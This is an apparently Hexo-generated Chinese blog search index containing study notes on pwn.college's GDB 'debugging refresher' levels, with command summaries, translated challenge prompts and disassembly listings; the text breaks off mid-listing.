<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>pwn college 刷题记录：debugging refresher</title>
    <link href="/p/a2494a57/"/>
    <url>/p/a2494a57/</url>
    
    <content type="html"><![CDATA[<p>GDB 非常强大！</p><span id="more"></span><p><img src="/image/pwn-college.png"></p><p><a href="https://pwn.college/fundamentals/debugging-refresher">https://pwn.college/fundamentals/debugging-refresher</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>熟悉一些gdb命令 <ul><li>一些常用的指令<ul><li>layout asm</li><li>layout regs</li><li>display /10i <ul><li>undisplay num 取消</li></ul></li><li> <code>start</code> 启动程序，断点设置在 <code>main</code> </li><li> <code>run</code> 启动程序，不设置断点</li><li>p/x $rax 以十六进制打印出rax的值</li><li>x 查看内存的值<ul><li><code>x/20g  $rbp-0x18</code></li></ul></li><li>set 修改内存的值<ul><li><code>set *(int*)($rbp-0x1c) = 100</code></li></ul></li><li><code>call (void)win()</code>  调用函数</li></ul></li></ul></li><li>熟悉如何写gdb脚本与程序进行交互<ul><li>gdb启动时候的脚本：.gdbinit</li><li>与程序交互的脚本：xxx.gdb。将命令写入某个文件，例如<code>x.gdb</code>，然后使用标志<code>-x &lt;PATH_TO_SCRIPT&gt;</code>启动gdb</li><li>调整汇编风格：<code>set disassembly-flavor intel</code></li></ul></li></ul><h1 id="Lectures-and-Reading"><a href="#Lectures-and-Reading" class="headerlink" title="Lectures and Reading"></a>Lectures and Reading</h1><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">GDB是一个非常强大的动态分析工具，您可以使用它来了解程序在执行过程中的状态。在本模块中，您将熟悉一些GDB的功能。<br><br>您正在运行GDB！程序当前处于暂停状态。这是因为它在这里设置了断点。<br><br>您可以使用命令 `start` 启动程序，断点设置在 `main` 上。您可以使用命令 `starti` 启动程序，断点设置在 `_start` 上。您可以使用命令 `run` 启动程序，不设置断点。您可以使用命令 `attach &lt;PID&gt;` 连接到其他已经运行的程序。您可以使用命令 `core &lt;PATH&gt;` 分析已经运行的程序的核心转储。<br><br>在启动或运行程序时，您可以几乎以与在shell中相同的方式指定参数。例如，您可以使用 `start &lt;ARGV1&gt; &lt;ARGV2&gt; &lt;ARGVN&gt; &lt; &lt;STDIN_PATH&gt;`。<br><br>使用命令 `continue` 或 `c` 继续执行程序。<br></code></pre></td></tr></table></figure><p>直接run，程序执行完毕时吐出flag</p><h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>打印出寄存器的值</p><ul><li>info registers</li><li>p/x $rax <ul><li>以十六进制打印出rax的值</li></ul></li></ul><p>flag存在r12寄存器中</p><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>GDB是一个非常强大的动态分析工具，您可以使用它来了解程序在执行过程中的状态。在本模块中，您将熟悉一些GDB的功能。<br><br>您可以使用 `x/&lt;n&gt;&lt;u&gt;&lt;f&gt; &lt;address&gt;` 命令来检查内存的内容。在这个格式中，`&lt;u&gt;` 是要显示的单元大小，`&lt;f&gt;` 是要显示的格式，`&lt;n&gt;` 是要显示的元素数量。有效的单元大小有 `b`（<span class="hljs-number">1</span>字节）、`h`（<span class="hljs-number">2</span>字节）、`w`（<span class="hljs-number">4</span>字节）和 `g`（<span class="hljs-number">8</span>字节）。有效的格式有 `d`（十进制）、`x`（十六进制）、`s`（字符串）和 `i`（指令）。地址可以使用寄存器名、符号名或绝对地址来指定。此外，在指定地址时，您还可以使用数学表达式。<br><br>例如，`x/<span class="hljs-number">8</span>i $rip` 将打印当前指令指针后面的<span class="hljs-number">8</span>条指令。`x/<span class="hljs-number">16</span>i main` 将打印 main 函数的前<span class="hljs-number">16</span>条指令。您还可以使用 `disassemble main` 或 `disas main`（简写）来打印 main 函数的所有指令。另外，`x/<span class="hljs-number">16</span>gx $rsp` 将打印堆栈上的前<span class="hljs-number">16</span>个值。`x/gx $rbp-<span class="hljs-number">0</span>x32` 将打印存储在堆栈上的该位置的局部变量。<br><br>您可能希望使用正确的汇编语法查看指令。您可以使用命令 `set disassembly-flavor intel` 来实现。<br><br>为了解决这个关卡，您必须找出堆栈上的随机值（从 `/dev/urandom` 读取的值）。思考一下 read 系统调用的参数是什么。<br><br>程序接收到信号 SIGTRAP，跟踪/断点陷阱。<br></code></pre></td></tr></table></figure><ul><li>layout asm</li><li>layout regs</li></ul><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>. `open`函数：<br>    <br>    `#include &lt;fcntl.h&gt; int open(const char *pathname, int flags, mode_t mode)<span class="hljs-comment">;`</span><br>    <br>    `open`函数用于打开一个文件，并返回文件描述符（file descriptor）。它接受三个参数：<br>    <br>    - `pathname`：要打开的文件的路径名。<br>    - `flags`：打开文件的标志，例如`O_RDONLY`（只读）、`O_WRONLY`（只写）、`O_RDWR`（读写）等。<br>    - `mode`：指定新创建文件的权限，通常使用八进制表示，例如`0644`。<br>    <br>    `open`函数返回一个非负整数的文件描述符，如果出现错误，则返回-<span class="hljs-number">1</span>。<br>    <br><span class="hljs-number">2</span>. `read`函数：<br>    <br>    `#include &lt;unistd.h&gt; ssize_t read(int fd, void *buf, size_t count)<span class="hljs-comment">;`</span><br>    <br>    `read`函数用于从文件中读取数据。它接受三个参数：<br>    <br>    - `fd`：要读取的文件的文件描述符。<br>    - `buf`：用于存储读取数据的缓冲区的指针。<br>    - `count`：要读取的最大字节数。<br>    <br>    `read`函数返回实际读取的字节数，如果返回值为<span class="hljs-number">0</span>表示已到达文件末尾，如果返回-<span class="hljs-number">1</span>表示出现错误。<br></code></pre></td></tr></table></figure><p>看一下对应的逻辑</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0000000000001C2C loc_1C2C:                               <span class="hljs-comment">; CODE XREF: .text:0000000000001CDD↓j</span><br><span class="hljs-symbol">.text:</span>0000000000001C2C                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001C31                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aDevUrandom <span class="hljs-comment">; &quot;/dev/urandom&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001C38                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001C3D                 <span class="hljs-keyword">call</span>    _open<br><span class="hljs-symbol">.text:</span>0000000000001C42                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0000000000001C44                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">18h</span>]<br><span class="hljs-symbol">.text:</span>0000000000001C48                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>0000000000001C4D                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001C50                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-built_in">ecx</span><br><span class="hljs-symbol">.text:</span>0000000000001C52                 <span class="hljs-keyword">call</span>    _read<br><span class="hljs-symbol">.text:</span>0000000000001C57                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aTheRandomValue <span class="hljs-comment">; &quot;The random value has been set!\n&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001C5E                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C63                 <span class="hljs-keyword">int</span>     <span class="hljs-number">3</span>               <span class="hljs-comment">; Trap to Debugger</span><br></code></pre></td></tr></table></figure><p>这里打开random文件，然后read到缓冲区中，获取缓冲区的内容，作为下一个scanf函数的输入，即可获得flag</p><p>x/20g  $rbp-0x18即可读取</p><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">动态分析的一个关键部分是将程序运行到您感兴趣的状态。到目前为止，这些挑战已经为您自动设置了断点，以便在您可能感兴趣的状态下暂停执行。自己能够做到这一点非常重要。<br><br>在程序的执行过程中，有多种方式可以向前移动。您可以使用`stepi &lt;n&gt;`命令或`si &lt;n&gt;`命令（简写）向前单步执行一条指令。您可以使用`nexti &lt;n&gt;`命令或`ni &lt;n&gt;`命令（简写）向前单步执行一条指令，同时跳过任何函数调用。`&lt;n&gt;`参数是可选的，但可以让您一次执行多个步骤。您可以使用`finish`命令来完成当前正在执行的函数。您可以使用`break *&lt;address&gt;`参数化命令在指定的地址设置断点。您已经使用了`continue`命令，它将继续执行，直到程序遇到断点。<br><br>在逐步执行程序时，您可能会发现始终显示一些值对您很有用。有多种方法可以做到这一点。最简单的方法是使用`display/&lt;n&gt;&lt;u&gt;&lt;f&gt;`参数化命令，其格式与`x/&lt;n&gt;&lt;u&gt;&lt;f&gt;`参数化命令完全相同。例如，`display/<span class="hljs-number">8</span>i $rip`将始终显示接下来的<span class="hljs-number">8</span>条指令。另一方面，`display/<span class="hljs-number">4</span>gx $rsp`将始终显示堆栈上的前<span class="hljs-number">4</span>个值。另一个选项是使用`layout regs`命令。这将将GDB切换到TUI模式，并显示所有寄存器的内容，以及附近的指令。<br><br>为了解决这个级别的问题，您必须找出一系列将放置在堆栈上的随机值。强烈建议您尝试使用`stepi`、`nexti`、`break`、`continue`和`finish`的组合，以确保您对这些命令有良好的内部理解。这些命令在导航程序的执行过程中是绝对关键的。<br></code></pre></td></tr></table></figure><p>看一下汇编源码</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0000000000001AA6 <span class="hljs-comment">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="hljs-symbol">.text:</span>0000000000001AA6                 <span class="hljs-meta">public</span> main<br><span class="hljs-symbol">.text:</span>0000000000001AA6 main            proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: _start+21↑o</span><br><span class="hljs-symbol">.text:</span>0000000000001AA6<br><span class="hljs-symbol">.text:</span>0000000000001AA6 var_38          = <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">38h</span><br><span class="hljs-symbol">.text:</span>0000000000001AA6 var_30          = <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">30h</span><br><span class="hljs-symbol">.text:</span>0000000000001AA6 var_24          = <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">24h</span><br><span class="hljs-symbol">.text:</span>0000000000001AA6 var_8           = <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">8</span><br><span class="hljs-symbol">.text:</span>0000000000001AA6<br><span class="hljs-symbol">.text:</span>0000000000001AA6 <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span>0000000000001AA6                 endbr64<br><span class="hljs-symbol">.text:</span>0000000000001<span class="hljs-keyword">AAA</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>0000000000001AAB                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span>0000000000001AAE                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">40h</span><br><span class="hljs-symbol">.text:</span>0000000000001AB2                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_24], <span class="hljs-built_in">edi</span><br><span class="hljs-symbol">.text:</span>0000000000001AB5                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_30], <span class="hljs-built_in">rsi</span><br><span class="hljs-symbol">.text:</span>0000000000001AB9                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_38], <span class="hljs-built_in">rdx</span><br><span class="hljs-symbol">.text:</span>0000000000001ABD                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">fs</span>:<span class="hljs-number">28h</span><br><span class="hljs-symbol">.text:</span>0000000000001AC6                 <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">rbp</span>+var_8], <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001ACA                 <span class="hljs-keyword">xor</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-built_in">eax</span><br><span class="hljs-symbol">.text:</span>0000000000001ACC                 <span class="hljs-keyword">cmp</span>     [<span class="hljs-built_in">rbp</span>+var_24], <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001AD0                 <span class="hljs-keyword">jg</span>      short loc_1AF1<br><span class="hljs-symbol">.text:</span>0000000000001AD2                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rcx</span>, __PRETTY_FUNCTION___5345 <span class="hljs-comment">; &quot;main&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001AD9                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">51h</span> <span class="hljs-comment">; &#x27;Q&#x27;  ; line</span><br><span class="hljs-symbol">.text:</span>0000000000001ADE                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rsi</span>, file       <span class="hljs-comment">; &quot;&lt;stdin&gt;&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001AE5                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aArgc0     <span class="hljs-comment">; &quot;argc &gt; 0&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001AEC                 <span class="hljs-keyword">call</span>    ___assert_fail<br><span class="hljs-symbol">.text:</span>0000000000001AF1 <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span>0000000000001AF1<br><span class="hljs-symbol">.text:</span>0000000000001AF1 loc_1AF1:                               <span class="hljs-comment">; CODE XREF: main+2A↑j</span><br><span class="hljs-symbol">.text:</span>0000000000001AF1                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, asc_21C5   <span class="hljs-comment">; &quot;###&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001AF8                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001AFD                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>+var_30]<br><span class="hljs-symbol">.text:</span>0000000000001B01                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rax</span>]<br><span class="hljs-symbol">.text:</span>0000000000001B04                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br><span class="hljs-symbol">.text:</span>0000000000001B07                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aWelcomeToS <span class="hljs-comment">; &quot;### Welcome to %s!\n&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001B0E                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>0000000000001B13                 <span class="hljs-keyword">call</span>    _printf<br><span class="hljs-symbol">.text:</span>0000000000001B18                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, asc_21C5   <span class="hljs-comment">; &quot;###&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001B1F                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001B24                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">0Ah</span>        <span class="hljs-comment">; c</span><br><span class="hljs-symbol">.text:</span>0000000000001B29                 <span class="hljs-keyword">call</span>    _putchar<br><span class="hljs-symbol">.text:</span>0000000000001B2E                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">cs</span>:stdin@@GLIBC_2_2_5<br><span class="hljs-symbol">.text:</span>0000000000001B35                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-number">0</span>          <span class="hljs-comment">; n</span><br><span class="hljs-symbol">.text:</span>0000000000001B3A                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">2</span>          <span class="hljs-comment">; modes</span><br><span class="hljs-symbol">.text:</span>0000000000001B3F                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span>          <span class="hljs-comment">; buf</span><br><span class="hljs-symbol">.text:</span>0000000000001B44                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span>        <span class="hljs-comment">; stream</span><br><span class="hljs-symbol">.text:</span>0000000000001B47                 <span class="hljs-keyword">call</span>    _setvbuf<br><span class="hljs-symbol">.text:</span>0000000000001B4C                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">cs</span>:__bss_start<br><span class="hljs-symbol">.text:</span>0000000000001B53                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">ecx</span>, <span class="hljs-number">1</span>          <span class="hljs-comment">; n</span><br><span class="hljs-symbol">.text:</span>0000000000001B58                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">2</span>          <span class="hljs-comment">; modes</span><br><span class="hljs-symbol">.text:</span>0000000000001B5D                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">esi</span>, <span class="hljs-number">0</span>          <span class="hljs-comment">; buf</span><br><span class="hljs-symbol">.text:</span>0000000000001B62                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span>        <span class="hljs-comment">; stream</span><br><span class="hljs-symbol">.text:</span>0000000000001B65                 <span class="hljs-keyword">call</span>    _setvbuf<br><span class="hljs-symbol">.text:</span>0000000000001B6A                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aGdbIsAVeryPowe <span class="hljs-comment">; &quot;GDB is a very powerful dynamic analysis&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001B71                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001B76                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aItsExecutionYo <span class="hljs-comment">; &quot;its execution. You will become familiar&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001B7D                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001B82                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aACriticalPartO <span class="hljs-comment">; &quot;A critical part of dynamic analysis is &quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001B89                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001B8E                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aChallengesHave <span class="hljs-comment">; &quot;challenges have automatically set break&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001B95                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001B9A                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aItIsImportantT <span class="hljs-comment">; &quot;It is important to be able to do this y&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001BA1                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BA6                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aThereAreANumbe <span class="hljs-comment">; &quot;There are a number of ways to move forw&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001BAD                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BB2                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aForShortInOrde <span class="hljs-comment">; &quot;for short, in order to step forward one&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001BB9                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BBE                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aOrderToStepFor <span class="hljs-comment">; &quot;order to step forward one instruction, &quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001BC5                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BCA                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aAllowsYouToPer <span class="hljs-comment">; &quot;allows you to perform multiple steps at&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001BD1                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BD6                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aExecutingFunct <span class="hljs-comment">; &quot;executing function. You can use the `br&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001BDD                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BE2                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aSpecifiedAddre <span class="hljs-comment">; &quot;specified-address. You have already use&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001BE9                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BEE                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aBreakpoint <span class="hljs-comment">; &quot;breakpoint.\n&quot;</span><br><span class="hljs-symbol">.text:</span>0000000000001BF5                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001BFA                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aWhileSteppingT <span class="hljs-comment">; &quot;While stepping through a program, you m&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C01                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C06                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aMultipleWaysTo <span class="hljs-comment">; &quot;multiple ways to do this. The simplest &quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C0D                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C12                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aExactlyTheSame <span class="hljs-comment">; &quot;exactly the same format as the `x/&lt;n&gt;&lt;u&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C19                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C1E                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aTheNext8Instru <span class="hljs-comment">; &quot;the next 8 instructions. On the other h&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C25                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C2A                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aAnotherOptionI <span class="hljs-comment">; &quot;Another option is to use the `layout re&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C31                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C36                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aOfTheRegisters <span class="hljs-comment">; &quot;of the registers, as well as nearby ins&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C3D                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C42                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aInOrderToSolve <span class="hljs-comment">; &quot;In order to solve this level, you must &quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C49                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>0000000000001C4E                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, aHighlyEncourag <span class="hljs-comment">; &quot;highly encouraged to try using combinat&quot;...</span><br><span class="hljs-symbol">.text:</span>0000000000001C55                 <span class="hljs-keyword">call</span>    